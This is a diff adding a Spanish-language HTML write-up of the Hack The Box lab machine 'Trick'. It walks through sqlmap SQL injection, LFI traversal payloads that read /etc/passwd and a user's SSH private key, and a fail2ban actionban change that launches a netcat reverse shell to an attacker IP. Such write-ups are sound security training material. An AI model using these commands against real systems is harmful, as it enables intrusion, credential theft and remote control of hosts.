@@ -1,0 +1,112 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Writeup HTB Trick | Daniel Galindo</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Space+Grotesk:wght@400;500;700&display=swap"
+      rel="stylesheet"
+    />
+    <link rel="stylesheet" href="../src/styles/styles.css" />
+  </head>
+  <body data-page="writeups">
+    <div class="grid-overlay" aria-hidden="true"></div>
+    <div class="noise-overlay" aria-hidden="true"></div>
+
+    <header class="site-header">
+      <a class="site-logo" href="../index.html">met4ll0f</a>
+      <nav class="site-nav" aria-label="Navegación principal">
+        <a data-nav="inicio" href="../index.html">Inicio</a>
+        <a data-nav="writeups" href="../writeups.html">Writeups</a>
+        <a data-nav="scripts" href="../scripts.html">Scripts</a>
+      </nav>
+    </header>
+
+    <section class="hero hero-compact">
+      <p class="hero-kicker">Hack The Box · Linux</p>
+      <h1>Trick</h1>
+      <p class="headline">SQL Injection, LFI y escalada mediante fail2ban</p>
+      <p class="meta">Dificultad: Media · Objetivo: root</p>
+    </section>
+
+    <main class="writeup-article">
+      <section class="panel panel-large">
+        <h2>Resumen técnico</h2>
+        <p>
+          Esta máquina combina fallos en DNS/web y debilidades de configuración local. La intrusión empieza con
+          transferencia de zona DNS para descubrir subdominios, continúa con inyección SQL en un entorno preproducción,
+          evoluciona a LFI para leer archivos sensibles y termina con acceso SSH al usuario <code>michael</code>. La
+          escalada final se logra alterando la acción de bloqueo de fail2ban gracias a permisos de grupo sobre el
+          directorio de acciones.
+        </p>
+      </section>
+
+      <section class="panel panel-large">
+        <h2>1) Descubrimiento de superficie y SQLi</h2>
+        <p>
+          Los servicios expuestos fueron <code>22</code>, <code>25</code>, <code>53</code> y <code>80</code>. El DNS
+          permitió transferencia de zona y aparición del subdominio <code>preprod-payroll.trick.htb</code>. El formulario
+          de login resultó vulnerable a SQLi básica y luego validada con sqlmap.
+        </p>
+        <pre><code>sqlmap -u 'http://preprod-payroll.trick.htb/ajax.php?action=login' \
+  --data "username=123&password=123" -p username --level 5 --risk 3 --batch --privileges</code></pre>
+        <figure class="writeup-figure">
+          <img class="writeup-image" src="../src/images/writeups/trick/trick-sqli-sqlmap.png" alt="Explotación SQLi con sqlmap" />
+          <figcaption class="writeup-caption">Validación de inyección SQL y confirmación de privilegio FILE.</figcaption>
+        </figure>
+        <p>
+          Con privilegio <code>FILE</code> se leyeron archivos del sistema, incluyendo configuración de Nginx para hallar
+          nuevo virtual host objetivo.
+        </p>
+      </section>
+
+      <section class="panel panel-large">
+        <h2>2) LFI y acceso inicial por SSH</h2>
+        <p>
+          En el nuevo sitio se explotó parámetro <code>page</code> con traversal para leer
+          <code>/etc/passwd</code> y después la clave privada <code>/home/michael/.ssh/id_rsa</code>. Esa clave permitió
+          autenticación SSH directa como <code>michael</code>.
+        </p>
+        <pre><code>/index.php?page=....//....//....//....//....//etc/passwd
+/index.php?page=....//....//....//....//....//home/michael/.ssh/id_rsa
+ssh -i michael_id_rsa michael@10.129.x.x</code></pre>
+        <figure class="writeup-figure">
+          <img class="writeup-image" src="../src/images/writeups/trick/trick-lfi-idrsa.png" alt="Lectura de clave SSH de michael mediante LFI" />
+          <figcaption class="writeup-caption">LFI para exfiltrar id_rsa y obtener acceso inicial por SSH.</figcaption>
+        </figure>
+      </section>
+
+      <section class="panel panel-large">
+        <h2>3) Escalada a root con fail2ban</h2>
+        <p>
+          El usuario no tenía sudo directo para root, pero sí pertenencia al grupo <code>security</code>. Este grupo tenía
+          control del directorio <code>/etc/fail2ban/action.d</code>, permitiendo reemplazar archivos de acción. Se
+          reemplazó <code>iptables-multiport.conf</code> y se modificó <code>actionban</code> para ejecutar una shell
+          inversa cuando fail2ban aplicara un bloqueo.
+        </p>
+        <pre><code>mv iptables-multiport.conf iptables-multiport.conf.old
+cp iptables-multiport.conf.old iptables-multiport.conf
+echo '/usr/bin/nc -e /bin/bash 10.10.16.47 4444' &gt; /tmp/shell.sh
+chmod +x /tmp/shell.sh</code></pre>
+        <figure class="writeup-figure">
+          <img class="writeup-image" src="../src/images/writeups/trick/trick-fail2ban-actionban.png" alt="Modificación de actionban en fail2ban" />
+          <figcaption class="writeup-caption">Reemplazo de actionban para ejecución de payload durante el bloqueo.</figcaption>
+        </figure>
+        <p>
+          Tras reiniciar fail2ban y disparar intentos de login inválidos, se ejecutó la acción maliciosa y se recibió
+          shell como <code>root</code>.
+        </p>
+      </section>
+    </main>
+
+    <footer class="footer">
+      <p>© <span class="js-year"></span> <span class="js-name"></span>.</p>
+      <a href="../writeups.html">Volver a writeups</a>
+    </footer>
+
+    <script type="module" src="../src/js/site.js"></script>
+  </body>
+</html>
